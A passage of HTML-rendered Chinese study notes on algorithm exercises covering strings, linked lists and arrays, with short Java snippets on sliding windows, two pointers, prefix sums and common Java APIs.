class="number">3</span>：当滑动窗口hashMapS某些元素多于标准t的hashMap时，在hashMap中减去该元素，以此减少最后计算包含关系的开销。但随着滑动窗口移动，可能又不再多于，因此不知道如何实现。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>思路<span class="number">1</span>：本题的解题思路很简单，用hashMap记录s当前子串中标准t字符的词频，先移动右指针扩展子串到满足题目，再移动左指针不断刷新minLength。前面说的“可能有不再多于”，这里是通过判断标准t字符的需求解决的：如最开始count = hashMap.size()，当移动右指针满足题目后count减少到<span class="number">0</span>，移动左指针刷新minLength致某刻count&gt;<span class="number">0</span>，说明某字符导致子串不再满足，这时就需要再移动右指针去尝试满足，直到遍历到字符串末尾。</span><br><span class="line">    这里记录下最外层<span class="keyword">while</span>循环：</span><br><span class="line">    <span class="keyword">while</span>(end&lt;s.length()||(end==s.length()&amp;&amp;count==<span class="number">0</span>))</span><br><span class="line">    (end==s.length()&amp;&amp;count==<span class="number">0</span>)是因为，当遍历到最后一个字符且满足t需求时，仍然需要移动左指针刷新minLength；(end==s.length()&amp;&amp;count!=<span class="number">0</span>)则不可，因为没法移动右指针再满足了。这种写法还能应对s和t长度均为<span class="number">1</span>的特殊情况。</span><br></pre></td></tr></table></figure><h3 id="018-有效的回文（125、8月20日）"><a href="#018-有效的回文（125、8月20日）" class="headerlink" title="018.有效的回文（125、8月20日）"></a>018.有效的回文（125、8月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题比较简单，就是两指针分别从开始、末尾出发，在满足左指针小于右指针的情况下，移动不是字母或数字的位置，或是在字母或数字位置判断是否回文，并同时移动指针。</span><br><span class="line"><span class="number">2.</span>常用api记录：</span><br><span class="line">Character.isLetterOrDigit  <span class="comment">//返回Boolean,判断字符是否为字母或数字</span></span><br><span class="line">Character.toLowerCase  <span class="comment">//返回字符小写</span></span><br></pre></td></tr></table></figure><h3 id="019-最多删除一个字符得到回文（680、8月20日）"><a href="#019-最多删除一个字符得到回文（680、8月20日）" class="headerlink" title="019.最多删除一个字符得到回文（680、8月20日）"></a>019.最多删除一个字符得到回文（680、8月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：设置标志位，当flag减少到-<span class="number">1</span>时跳出循环，外层循环是<span class="keyword">while</span>(i&lt;j &amp;&amp; flag&gt;=<span class="number">0</span>)，返回值是<span class="keyword">return</span> i&gt;=j。遇到一种特殊情况无法解决，即在某一刻左指针下一位等于右指针，右指针下一位也等于左指针：如<span class="string">&quot;lcupuu&quot;</span>和<span class="string">&quot;uupucul&quot;</span>，这会导致本来该移动右指针减去一个u，却使得先移动左指针减去一个c。可以想到这种情况适用回溯法。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：递归法。当不满足回文时，移动左指针或者右指针，将标志位flag设置为<span class="literal">false</span>，向下递归。</span><br><span class="line">     <span class="keyword">return</span> check(s,!flag,left+<span class="number">1</span>,right)||check(s,!flag,left,right-<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="020-回文子字符串的个数（647、8月20日）"><a href="#020-回文子字符串的个数（647、8月20日）" class="headerlink" title="020.回文子字符串的个数（647、8月20日）"></a>020.回文子字符串的个数（647、8月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，做了这些滑动窗口的题目，面对这道题还是束手无策。想到从字符串中间开始往两边开滑，那么字符串中间怎么移动呢？如何应对奇数和偶数的区别呢？归根结底是没有看作窗口，滑动窗口是一个子串，需要一个外围循环确定窗口位置，窗口再向两边扩展。</span><br><span class="line"><span class="number">2.</span>这道题直接看题解了，代码非常简单，就是递归。这样就能移动以每个字符为中心的窗口，和前面的题目不同，是递归，而没有滑动窗口对应的存储结构。windowExtend实现计算以i为中心的字符串存在多少回文，或者以(i,i+<span class="number">1</span>)为中心。</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)&#123; count += windowExtend(s,i,i); count += windowExtend(s,i,i+<span class="number">1</span>);&#125;</span><br></pre></td></tr></table></figure><h3 id="总结之字符串"><a href="#总结之字符串" class="headerlink" title="总结之字符串"></a>总结之字符串</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>api记录的复制：</span><br><span class="line">    s1.CharAt(index);  <span class="comment">//根据索引确定字符</span></span><br><span class="line">    s1.indexOf(s2);   <span class="comment">//给出子串位置</span></span><br><span class="line">    s.substring(minStart,minEnd);  <span class="comment">//返回子串，包头不包尾</span></span><br><span class="line">String[] t = time.split(<span class="string">&quot;:&quot;</span>);  <span class="comment">//按指定字符分割String</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> String.join(<span class="string">&quot; &quot;</span>,t) <span class="comment">//按指定分隔符拼接一个字符串</span></span><br><span class="line">    Character.isLetterOrDigit  <span class="comment">//返回Boolean,判断字符是否为字母或数字</span></span><br><span class="line">    Character.toLowerCase  <span class="comment">//返回字符小写</span></span><br><span class="line">    hashMap.put(ch,hashMap.getOrDefault(ch,<span class="number">0</span>)+<span class="number">1</span>);  <span class="comment">//getOrDefault，如果不存在该键就返回默认值0，省去判断</span></span><br><span class="line">    <span class="type">char</span>[] charArray = s.toCharArray();  <span class="comment">//String转char[] String -&gt; char[]</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> String.valueOf(charArray);  <span class="comment">//char[]转String  char[] -&gt; String</span></span><br><span class="line"></span><br><span class="line">    result.toString();   <span class="comment">//StringBuffer类转String  StringBuffer -&gt; String</span></span><br><span class="line">  builder.reverse().toString();  <span class="comment">//StringBuffer类转String  先对StringBuffer进行反转</span></span><br><span class="line">    result.append(x); <span class="comment">//StringBuffer添加char型元素</span></span><br><span class="line">    result.deleteCharAt(index);  <span class="comment">//StringBuffer实现根据索引删除元素</span></span><br><span class="line"><span class="number">2.</span>变位词，想到HashMap；回文，想到双指针。</span><br><span class="line"><span class="number">3.</span>StringBuffer和StringBuilder的区别</span><br><span class="line">    标准答案：前者线程安全，后者线程不安全。前者是早期Java设计者避免开发频繁写<span class="keyword">synchronized</span>代码块造成可读性和易用性降低，就把标准库中StringBuffer、Vector、Hashtable、ByteArray&#123;Input,Output&#125;Stream 等可变对象设计成线程安全的。但后来发现多个线程同时修改一个对象的场景才是少数，故后来的ArrayList、HashMap、StringBuilder等可变类不再默认线程安全，以此换取单线程下的性能提升。</span><br><span class="line"><span class="number">4.</span>字符串的比较：</span><br><span class="line">    （<span class="number">1</span>）.String a=<span class="string">&quot;abc&quot;</span>,b=<span class="string">&quot;abc&quot;</span>;   <span class="comment">//a==b将返回true，相同的字符串在内存中只会存一份，a和b都会指向“abc”常量</span></span><br><span class="line">    （<span class="number">2</span>）.String a=<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>); String b=<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);   </span><br><span class="line"><span class="comment">//a==b将返回false，a和b指向不同的对象</span></span><br><span class="line"><span class="comment">//a.equals(b)是比较字符串内容是否相同</span></span><br><span class="line"><span class="comment">//字符串值比较一定要用s.equals(&quot;0&quot;)，而不是s==&quot;0&quot;，这里s是通过&quot;&quot;+ch不断累加得到的。</span></span><br><span class="line"><span class="number">5.</span><span class="type">int</span>和String互相转换api：</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(str);<span class="comment">//String转int</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> Integer.valueOf(str).intValue();<span class="comment">//String装int</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> String.valueOf(n);<span class="comment">//int转String</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Integer.toString(n);<span class="comment">//int转String</span></span><br><span class="line"><span class="number">6.</span>ascii转换api：</span><br><span class="line">    <span class="type">char</span> <span class="variable">zimu</span> <span class="operator">=</span> (<span class="type">char</span>)(<span class="number">96</span>+<span class="number">1</span>);   <span class="comment">//结果为a</span></span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> ch-<span class="string">&#x27;a&#x27;</span> <span class="comment">//结果为a的ascii编号</span></span><br><span class="line"><span class="number">7.</span>双层List&lt;List&lt;String&gt;&gt; 转 String[][]，内层不定长时的coding技巧：</span><br><span class="line">    String[][] finals = <span class="keyword">new</span> <span class="title class_">String</span>[results.size()][];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;results.size();i++)&#123;</span><br><span class="line">        List&lt;String&gt; list = results.get(i);</span><br><span class="line">        finals[i] = list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[list.size()]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">8.</span><span class="type">char</span>转<span class="type">int</span>：</span><br><span class="line">    <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> Integer.parseInt(String.valueOf(charArray[i]));</span><br></pre></td></tr></table></figure><h2 id="第四章、链表"><a href="#第四章、链表" class="headerlink" title="第四章、链表"></a>第四章、链表</h2><h3 id="021-删除链表的倒数第n个节点（19、8月21日）"><a href="#021-删除链表的倒数第n个节点（19、8月21日）" class="headerlink" title="021.删除链表的倒数第n个节点（19、8月21日）"></a>021.删除链表的倒数第n个节点（19、8月21日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，前后指针。先让一个指针first跑n个节点，再让另一个指针tail和first一起跑，这样当first到达链表末尾时，tail正好到达倒数第n个节点的前一个节点。设置dummy节点，将帮助更好理解第n个以及处理单节点输入的特殊情况。这道题调试几次就对了。</span><br></pre></td></tr></table></figure><h3 id="022-链表中环的入口节点（142、8月21日）"><a href="#022-链表中环的入口节点（142、8月21日）" class="headerlink" title="022.链表中环的入口节点（142、8月21日）"></a>022.链表中环的入口节点（142、8月21日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：一个指针遍历到某位置，下个指针从该位置开始遍历，直到与第一个指针重合。但是，循环链表没有<span class="literal">null</span>，导致循环无法停止。</span><br><span class="line"><span class="number">2.</span>我的想法<span class="number">2</span>：将链表节点放入HashSet，当再次遍历到且HashSet已经存储某节点时，就说明该节点是循环链表的入口。如果遍历链表时遇到<span class="literal">null</span>节点，说明该链表不是循环链表。注意，Set&lt;ListNode&gt;而不是Set&lt;Integer&gt;，因为测试用例中存在相同值的不同节点。</span><br><span class="line"><span class="number">3.</span>我在想，能快速写出测试用例、方便调试也算能力吧。</span><br><span class="line">    </span><br><span class="line"><span class="number">4.</span>思路<span class="number">2</span>：快慢指针。如果链表中有环，快慢两个指针必然会在环中某个节点相遇。假设快指针走两步、慢指针走一步，相遇时慢指针走了k步，快指针走了2k步，到相遇时快指针比慢指针多走k步，那么k必然是环中节点数目的整数倍，那么非环部分a+没走满的部分b=节点数目整数倍，假如一个指针headA从头节点出发，另一个指针headB从相遇慢指针的k位置出发，相同速度均为一步，那么它们都需要走a个单位到达环入口。</span><br><span class="line"><span class="number">5.</span>证明：快慢指针。设链表中环外部分的长度为a，slow指针进入环后，又走了b的距离与fast相遇，还剩c的距离凑够完整环。此时，fast指针已经走完了n圈，总距离为a+n(b+c)+b，而fast指针速度为<span class="number">2</span>，slow指针速度为<span class="number">1</span>，故有：</span><br><span class="line">    a+n(b+c)+b = <span class="number">2</span>(a+b)  -&gt;  a=c+(n-<span class="number">1</span>)(b+c)</span><br><span class="line">-&gt; 从相遇点到入环点的距离加上 n-<span class="number">1</span> 圈的环长，恰好等于从链表头部到入环点的距离。</span><br></pre></td></tr></table></figure><h3 id="023-两个链表的第一个重合节点（160、8月21日）"><a href="#023-两个链表的第一个重合节点（160、8月21日）" class="headerlink" title="023.两个链表的第一个重合节点（160、8月21日）"></a>023.两个链表的第一个重合节点（160、8月21日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：将链表节点放入HashSet。headA链表先遍历一遍，将节点放入hashSet，再遍历headB链表，当遍历到hashSet中已有节点时，说明该节点是重合节点，否则，返回<span class="literal">null</span>。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：快慢指针。假设链表headA=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]，链表headB=[<span class="number">7</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],那么可以让链表headB变为环（headB的尾节点next指向headB的头节点），整个链表变为[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]，其中<span class="number">8</span>指向<span class="number">4</span>，问题转换为寻找链表环的入口节点。但这样会改变链表结构。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">3</span>：栈。将两个链表压入两个栈，弹栈顶比较元素，直到最后一个相同元素，即从后往前比较。扩展这一想法，可以先求得两个链表的长度，将长的链表先移动d位差值，然后两个链表再同时同速度移动，这样就能同时到达交叉位置。</span><br></pre></td></tr></table></figure><h3 id="024-反转链表（206、8月22日）"><a href="#024-反转链表（206、8月22日）" class="headerlink" title="024.反转链表（206、8月22日）"></a>024.反转链表（206、8月22日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，遍历链表节点并压栈，弹栈后在最后一个元素后接<span class="literal">null</span>。这里记录下栈相关api:</span><br><span class="line">Deque&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">peek()：返回栈顶的值 ；不改变栈的值，查看栈顶的对象而不移除它。</span><br><span class="line">pop()：Stack(栈)的方法，返回栈顶的值 ；会把栈顶的值删除。</span><br><span class="line">poll：Queue(队列)的一个方法，获取并移除此队列的头，如果此队列为空，则返回<span class="literal">null</span>。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：迭代法。遍历时维护两个指针prev和cur，每轮遍历将cur.next存储起来，将cur.next修改为指向prev后，完成向前连接；接着将prev指向cur，将cur指向储存的cur.next提供下一轮遍历条件。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>：递归法，先不做。</span><br></pre></td></tr></table></figure><h3 id="025、链表中的两数相加（445、8月22日）"><a href="#025、链表中的两数相加（445、8月22日）" class="headerlink" title="025、链表中的两数相加（445、8月22日）"></a>025、链表中的两数相加（445、8月22日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，维护两个栈l1stack和l2stack，遍历两个链表并压栈，弹栈时求和，注意将最后的进位添加节点。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：先用<span class="number">24</span>题迭代法反转两个链表，再按照相同的加法逻辑求和。</span><br></pre></td></tr></table></figure><h3 id="026、重排链表（143、8月22日）"><a href="#026、重排链表（143、8月22日）" class="headerlink" title="026、重排链表（143、8月22日）"></a>026、重排链表（143、8月22日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：观察图示，即将链表转换为正向、逆向交替添加到链表。只需要将链表反转压栈，通过栈求得链表长度，按照链表长度遍历索引，如果索引模<span class="number">2</span>余<span class="number">0</span>则正向添加链表节点，如果索引模<span class="number">2</span>余<span class="number">1</span>则弹栈添加逆向链表节点，在外部修改链表结构并不会影响弹栈顺序，且弹栈后会直接修改next指针。注意将最后一个元素后接<span class="literal">null</span>避免环状链表，以及修改head指针指向dummy.next（因为函数返回<span class="keyword">void</span>）。</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)  <span class="comment">//因为目标建立len长度的链表，正向和逆向在结束时，实际都只遍历一半</span></span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：线性表。通过线性表的特定按顺序交替获取元素。</span><br><span class="line">        List&lt;ListNode&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;ListNode&gt;();  <span class="comment">//线性表建表</span></span><br><span class="line">        list.get(i).next = list.get(j);<span class="comment">//线性表获取元素</span></span><br><span class="line"><span class="number">3.</span>寻找链表中点（通过快慢指针） + 链表逆序 + 合并链表，先不做，和我的想法本质一样，但更加节省空间。</span><br></pre></td></tr></table></figure><h3 id="027、回文链表（234、8月22日）"><a href="#027、回文链表（234、8月22日）" class="headerlink" title="027、回文链表（234、8月22日）"></a>027、回文链表（234、8月22日）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.我的想法：遍历链表节点并压栈。在外围循环为for(int i=0;i&lt;len/2;i++)的情况下，遍历链表并同时弹栈，观察到node.val不相等时返回false，否则循环结束返回true。为什么是len/2，nodes = [1,2,3,2,1]，len=5，&lt;5/2 = &#123;0,1&#125;。</span><br><span class="line">2.思路2：递归法，先不做。</span><br></pre></td></tr></table></figure><h3 id="028、展平多级双向链表（430、8月23日）"><a href="#028、展平多级双向链表（430、8月23日）" class="headerlink" title="028、展平多级双向链表（430、8月23日）"></a>028、展平多级双向链表（430、8月23日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题目在看到它的序列化输入时，就已经被震慑住了。看书后明白，就是链表的节点既维护双向链表的两个指针prev和next，还维护一个指向子链表的指针child，题目需求是将子链表向上整合到原链表的两个节点之间。因此是典型的递归操作。</span><br><span class="line"><span class="number">2.</span>看懂题解后复现比较简单，就是维护当前链表遍历指针node和尾指针tail，通过node遍历链表时，如果该节点存在子节点child，维护指针Child存储node.child，将node.child置为<span class="literal">null</span>，并通过Child指针递归寻找链尾，在每轮遍历将tail指向新表尾。</span><br></pre></td></tr></table></figure><h3 id="029、排序的循环链表（708、8月24日）"><a href="#029、排序的循环链表（708、8月24日）" class="headerlink" title="029、排序的循环链表（708、8月24日）"></a>029、排序的循环链表（708、8月24日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法:这道题就是在循环链表中，按照大小顺序插入链表。通过<span class="keyword">while</span>(tail.next!=head)遍历链表节点，会遇到两种情况：</span><br><span class="line">    a.插入节点位于从小到大链表的中间</span><br><span class="line">    <span class="keyword">if</span>(insertVal &gt;= tail.val &amp;&amp; insertVal &lt;= tail.next.val)</span><br><span class="line">    b.插入节点位于从小到大链表的开始或末尾</span><br><span class="line">    <span class="keyword">if</span>(tail.val&gt; tail.next.val)</span><br><span class="line">                <span class="keyword">if</span>(insertVal &gt;= tail.val || insertVal &lt;= tail.next.val)</span><br><span class="line">    在这两种情况下<span class="keyword">break</span>，在当前遍历节点tail后添加插入节点即可。如果插入节点在链尾，tail.next=head，逻辑仍然是在tail后添加插入节点。</span><br></pre></td></tr></table></figure><h3 id="总结之链表"><a href="#总结之链表" class="headerlink" title="总结之链表"></a>总结之链表</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>api记录的复制：</span><br><span class="line">    Deque&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        peek()：返回栈顶的值 ；不改变栈的值，查看栈顶的对象而不移除它。</span><br><span class="line">        pop()：Stack(栈)的方法，返回栈顶的值 ；会把栈顶的值删除。</span><br><span class="line">        poll：Queue(队列)的一个方法，获取并移除此队列的头，如果此队列为空，则返回<span class="literal">null</span>。</span><br><span class="line">    List&lt;ListNode&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;ListNode&gt;();  <span class="comment">//线性表建表</span></span><br><span class="line">    list.get(i).next = list.get(j);<span class="comment">//线性表获取元素</span></span><br><span class="line"><span class="number">2.</span>反转链表有两种方法：其一，维护prev、cur和temp三个指针，其中temp是为了cur.next修改为指向prev时，temp存储cur.next避免破坏链表的结构；其二、遍历链表节点并压栈，弹栈构造反转链表。反转链表后，需要注意在最后一个元素后接<span class="literal">null</span>，避免环状。</span><br><span class="line"><span class="number">3.</span>添加虚节点dummy有助于避免头节点造成的边界特殊情况，用临时指针tail遍历不会改变链表结构：</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();  ... <span class="keyword">return</span> dummy.next;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line"><span class="number">4.</span>前后双指针、快慢双指针、虚节点、接<span class="literal">null</span>避免产生环状、反转链表。</span><br></pre></td></tr></table></figure><h2 id="第二章、数组"><a href="#第二章、数组" class="headerlink" title="第二章、数组"></a>第二章、数组</h2><h3 id="006、排序数组中两个数字之和（167、8月24日）"><a href="#006、排序数组中两个数字之和（167、8月24日）" class="headerlink" title="006、排序数组中两个数字之和（167、8月24日）"></a>006、排序数组中两个数字之和（167、8月24日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：双指针。&gt;target向左移动右指针，&lt;target向右移动左指针，外层<span class="keyword">while</span>循环避免两指针相遇，=target时跳出循环。</span><br></pre></td></tr></table></figure><h3 id="007、数组中和为0的三个数（15、8月24日）"><a href="#007、数组中和为0的三个数（15、8月24日）" class="headerlink" title="007、数组中和为0的三个数（15、8月24日）"></a>007、数组中和为0的三个数（15、8月24日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：双指针。首先通过Arrays.sort(nums)将数组变为有序数组，通过<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)让第一个数确定外层循环，再维护left、right双指针，按照第<span class="number">6</span>题中求两数之和的方法确定指针位置。这是第<span class="number">2</span>次做这道题，做出来比较容易，只需注意每层循环都应该有这个去重逻辑：</span><br><span class="line">    <span class="keyword">if</span>(left!=i+<span class="number">1</span>&amp;&amp;nums[left]==nums[left-<span class="number">1</span>])&#123;</span><br><span class="line">      left++;   </span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="008、-和大于等于-target-的最短子数组（209、8月24日）"><a href="#008、-和大于等于-target-的最短子数组（209、8月24日）" class="headerlink" title="008、 和大于等于 target 的最短子数组（209、8月24日）"></a>008、 和大于等于 target 的最短子数组（209、8月24日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：双指针。先移动右指针使sum&gt;target，再移动左指针使sum&lt;target来缩小子数组长度，最后返回right-left+<span class="number">1</span>。问题是，假如输入是[<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>]，右指针提前在第二个<span class="number">2</span>上停下，就会得到长度为<span class="number">4</span>的答案，实际应该在<span class="number">3</span>停下且答案为<span class="number">2</span>。可以发现，</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，双指针。改进我的思路，应该不要让右指针停下，而是在不断向右遍历直到结束；每找到答案，就在当前位置通过左指针求子数组（左指针移动会被保留），通过Math.min(result, end - start + <span class="number">1</span>)更新result。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，前缀和+二分查找，先不做。</span><br><span class="line"><span class="number">4.</span>这是第二次遇见这种思路的题，最开始写得时候不知道外围循环咋写，是按长度遍历，还是按右指针遍历。现在知道了，要按右指针遍历，解法是在每一个满足条件的右指针下更新左指针并比较result是否更小。</span><br></pre></td></tr></table></figure><h3 id="009、乘积小于k的子数组（713、8月26日）"><a href="#009、乘积小于k的子数组（713、8月26日）" class="headerlink" title="009、乘积小于k的子数组（713、8月26日）"></a>009、乘积小于k的子数组（713、8月26日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">2</span>，滑动窗口。维护双指针left、right，按右指针遍历，当累计乘积大于k后，更新左指针至小于k，统计滑动窗口内的子数组数目。这里要统计的子数组数目，是以right指针结尾的子数组，因此有(right-left+<span class="number">1</span>)个。</span><br><span class="line">a.不以right结尾的在前面已经统计过了;</span><br><span class="line">b.以right结尾，以更左的left开头的子数组是不存在的;</span><br><span class="line">  这道题结构写对了，对滑动窗口固定写法比较熟悉，但是想不出来如何统计子数组的数目，想不到(right-left+<span class="number">1</span>)。</span><br></pre></td></tr></table></figure><h3 id="010、和为k的子数组（560、8月26日）"><a href="#010、和为k的子数组（560、8月26日）" class="headerlink" title="010、和为k的子数组（560、8月26日）"></a>010、和为k的子数组（560、8月26日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：滑动窗口。按右指针遍历，当成绩不等于k后，更新左指针至等于k，并在更新过程中记录满足条件的数目。但是遇到了[<span class="number">1</span>,-<span class="number">1</span>,<span class="number">0</span>]这种输入，对于以<span class="number">0</span>结尾的right指针子数组，存在[<span class="number">1</span>,-<span class="number">1</span>,<span class="number">0</span>]和[<span class="number">0</span>]两种满足条件的情况，在前面算法中只会被记录<span class="number">1</span>次。书里说“双指针解决数组之和的前提是，数组中的所有数字都是正数”。</span><br><span class="line"><span class="number">2.</span>我的想法，暴力破解。按右指针遍历，将当前sum拷贝到tempSum中；在每一个右指针下移动左指针，同时减小tempSum，记录等于k的情况。<span class="keyword">for</span>(<span class="type">int</span> left=<span class="number">0</span>;left&lt;right;left++) &#123;</span><br><span class="line">    tempSum -= nums[left];</span><br><span class="line">    <span class="keyword">if</span>(tempSum==k) result+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，前缀和+哈希表优化。因为[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]之和+[<span class="number">4</span>,<span class="number">5</span>]之和=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]之和，故维护HashMap记录键值对&lt;当前和,次数&gt;，这样[<span class="number">4</span>,<span class="number">5</span>]=<span class="number">9</span>就能通过<span class="number">15</span>-[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]记录这个次数。需要注意，最开始map.put(<span class="number">0</span>,<span class="number">1</span>)，即应对第一个数字为k的情况。</span><br></pre></td></tr></table></figure><h3 id="011、0和1个数相同的子数组（525、8月26日）"><a href="#011、0和1个数相同的子数组（525、8月26日）" class="headerlink" title="011、0和1个数相同的子数组（525、8月26日）"></a>011、0和1个数相同的子数组（525、8月26日）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.我的想法：虽然看了题解知道这道题和第10题想法相同，但还是不会做。只知道这种古老的Math.max在召唤我。</span><br><span class="line">2.思路1：前缀和+哈希表优化。首先很巧妙的是把0转换成-1，这样某段子数组0和1数目相同时，就有[1,2,3]之和+[4,5]之和=[1,2,3,4,5]之和的效果，因为[4,5]此时-1和1恰巧相互抵消，[1,2,3]和[1,2,3,4,5]的累计和sum相同。这样只需维护hashMap&lt;sum,出现位置&gt;，当sum再次出现时，记录其和第一次出现位置的差值，这样就能不断通过Math.max更新最长长度。这道题思路比较特殊在：</span><br><span class="line">a.把0转换成-1，子数组满足条件时累计和为0；</span><br><span class="line">b.map.put(0,-1);  因为道理上应该子数组是（sum第一次出现的下一位，本位），所以每次放入本位，第一次放入-1位。</span><br></pre></td></tr></table></figure><h3 id="012、左右两边子数组的和相等（724、8月27日）"><a href="#012、左右两边子数组的和相等（724、8月27日）" class="headerlink" title="012、左右两边子数组的和相等（724、8月27日）"></a>012、左右两边子数组的和相等（724、8月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：维护两个整型和：leftSum和rightSum，先遍历数组将rightSum设置为数组中全部元素求和，然后第二次遍历数组，每轮遍历先将本位在rightSum中剔除，再比较leftSum和rightSum，最后在leftSum加上本位。因为本位不参与左右数组求和。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：前缀和。先给整体数组求和得total，那这时就有如下关系式，无需维护leftSum：</span><br><span class="line"><span class="keyword">if</span>(sum-nums[i] == total-sum)</span><br></pre></td></tr></table></figure><h3 id="013、二维子矩阵的和（304、8月27日）"><a href="#013、二维子矩阵的和（304、8月27日）" class="headerlink" title="013、二维子矩阵的和（304、8月27日）"></a>013、二维子矩阵的和（304、8月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：暴力破解。维护整型sum，设置两层循环不要越界即可。看其他解答好难得样子？</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=row1;i&lt;=row2;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=col1;j&lt;=col2;j++)</span><br><span class="line">                sum += matrix[i][j];</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：前缀和。维护二维数组<span class="type">int</span>[][] sums，在构造函数中给每一行求前缀和并存储，在计算子矩阵求和时，只需列下标、通过前缀和思想求得子矩阵每一行的和。这一解法中定义sums如下：</span><br><span class="line">    定义时：sums = <span class="keyword">new</span> <span class="title class_">int</span>[Length][rowLength+<span class="number">1</span>];</span><br><span class="line">    构造时：sums[i][j+<span class="number">1</span>] = matrix[i][j] + sums[i][j];</span><br><span class="line">    使用时：sum += sums[i][col2+<span class="number">1</span>]-sums[i][col1];</span><br><span class="line">因为不能像原来hashMap解决前缀和问题是，直接map.put(<span class="number">0</span>,-<span class="number">1</span>)这种处理首位，所以数组扩列。</span><br><span class="line"><span 